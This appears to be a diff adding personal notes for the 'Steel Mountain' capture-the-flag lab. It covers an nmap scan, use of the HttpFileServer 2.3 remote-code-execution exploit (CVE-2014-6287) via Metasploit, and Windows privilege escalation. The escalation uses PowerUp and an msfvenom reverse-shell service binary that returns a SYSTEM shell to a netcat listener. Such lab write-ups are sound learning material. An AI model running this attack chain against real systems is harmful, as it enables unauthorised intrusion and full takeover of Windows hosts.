@@ -1,0 +1,122 @@
+export IP=10.10.30.153
+
+nmap scan
+nmap $IP -v -oN nmap.log -A
+
+
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: STEELMOUNTAIN
+|   NetBIOS_Domain_Name: STEELMOUNTAIN
+|   NetBIOS_Computer_Name: STEELMOUNTAIN
+|   DNS_Domain_Name: steelmountain
+|   DNS_Computer_Name: steelmountain
+|   Product_Version: 6.3.9600
+|_  System_Time: 2024-10-20T07:52:21+00:00
+|_ssl-date: 2024-10-20T07:52:26+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=steelmountain
+| Issuer: commonName=steelmountain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-10-19T07:44:52
+| Not valid after:  2025-04-20T07:44:52
+| MD5:   da1f:d97b:a082:a6cc:3eb9:471c:9a64:3fdf
+|_SHA-1: 04fa:1831:d9d8:ae62:6665:78e1:8a45:d986:d1d8:894f
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-title: HFS /
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=10/20%OT=80%CT=1%CU=32374%PV=Y%DS=2%DC=T%G=Y%TM=671
+OS:4B6BB%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=RD%II=I%SS=
+OS:S%TS=7)SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M509NW8S
+OS:T11%O2=M509NW8ST11%O3=M509NW8NNT11%O4=M509NW8ST11%O5=M509NW8ST11%O6=M509
+OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
+OS:80%W=2000%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
+OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
+OS:F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
+OS:T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
+OS:=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%
+OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
+OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Uptime guess: 0.006 days (since Sun Oct 20 10:44:03 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-10-20T07:52:21
+|_  start_date: 2024-10-20T07:44:46
+| smb2-security-mode: 
+|   3:0:2: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:ec:2e:ca:81:f5 (unknown)
+| Names:
+|   STEELMOUNTAIN<20>    Flags: <unique><active>
+|   STEELMOUNTAIN<00>    Flags: <unique><active>
+|_  WORKGROUP<00>        Flags: <group><active>
+
+
+==> Website on port 80 - reveals employee of the month as Bill Harper
+
+====> enum4linux scan - results nothing
+
+==> on the port 8080 check the file server version and checked in exploitDB with this "HttpFileServer 2.3" filter, got one result for remote code execution
+exploit no.: 49125
+
+cmd: searchsploit -p 49125
+
+
+using metasploit framework for initial access
+-> cmd: search cve: 2014-6287
+-> use the exploit and set required options
+-> after gaining initial access -> in Desktop, cat user.txt -> for flag
+
+
+======= Privilege Escalation
+To enumerate the machine, we will use "PowerUp" powershell script, 
+Script download link: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+
+use the "upload" meterpreter command to upload the script to remote machine
+
+load powershell shell via commands, "load powershell" and "powershell_shell"
+
+run the commands: "./PowerUp.ps1" and "Invoke-AllChecks"
+
+generate reverse shell payload using msfvenom via command
+cmd: msfvenom -p windows/shell_reverse_tcp LHOST=<localIP> LPORT=<localPORT> -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+-> upload this to remote machine, then stop the service, sc stop <serviceName>
+
+-> open nc listener in local machine
+-> restart the service -> will get connection as nt authority\system to netcat listener
+
+
